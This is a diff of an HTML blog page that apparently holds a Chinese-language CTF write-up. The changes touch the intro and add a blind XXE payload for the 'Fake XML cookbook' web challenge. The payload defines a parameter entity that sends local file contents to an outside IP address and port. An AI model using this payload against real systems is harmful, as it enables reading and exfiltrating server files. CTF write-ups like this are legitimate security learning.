@@ -290,7 +290,7 @@
                 
               
 
-              <time title="Created: 2019-11-24 17:12:47 / Modified: 19:46:43" itemprop="dateCreated datePublished" datetime="2019-11-24T17:12:47+08:00">2019-11-24</time>
+              <time title="Created: 2019-11-24 17:12:47 / Modified: 20:37:55" itemprop="dateCreated datePublished" datetime="2019-11-24T17:12:47+08:00">2019-11-24</time>
             </span>
           
             
@@ -330,7 +330,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>题目挺好玩的，很多不会，慢慢写还是有点思路的，两天写了四个web题，学到了很多新知识。</p><p>1.Fake XML cookbook </p><p>测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下</p>
+          <p>题目挺好玩的，很多不会，慢慢写还是有点思路的，学到了很多新知识。</p><p>1.Fake XML cookbook </p><p>测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://47.103.62.94:8080/?content=%file;'&gt;"&gt; %payload;</span><br></pre></td></tr></table></figure>
           <!--noindex-->
           
             <div class="post-button">
